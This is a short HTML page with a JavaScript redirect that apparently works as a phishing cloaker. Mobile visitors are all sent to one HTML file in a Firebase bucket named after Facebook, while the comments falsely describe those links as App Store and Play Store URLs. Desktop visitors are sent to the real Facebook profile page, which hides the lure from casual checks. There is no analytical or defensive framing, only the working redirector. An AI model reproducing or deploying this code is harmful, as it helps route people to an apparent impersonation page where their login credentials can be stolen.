<html>
<head>
<body>
<script type="text/javascript"> var device = navigator.userAgent
 
if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/iPhone|iPad|iPod/i))
 	{ 
		window.location = "https://firebasestorage.googleapis.com/v0/b/facebook-9c9bf.appspot.com/o/--.html?alt=media&token=991bf0db-693a-486b-be5e-6c2157de0e6f"; //URL del APP Store
	}
else { 
	if (device.match(/Android/i))		
	{ 	
		window.location = "https://firebasestorage.googleapis.com/v0/b/facebook-9c9bf.appspot.com/o/--.html?alt=media&token=991bf0db-693a-486b-be5e-6c2157de0e6f"; //URL del Play Store
	}
	else
	{ 
		window.location = "https://www.facebook.com/profile.php"; //En el caso que el cliente este visitando desde un computador, lo enviamos a la web. 
	}
}

</script>

</body>
</head>
</html>
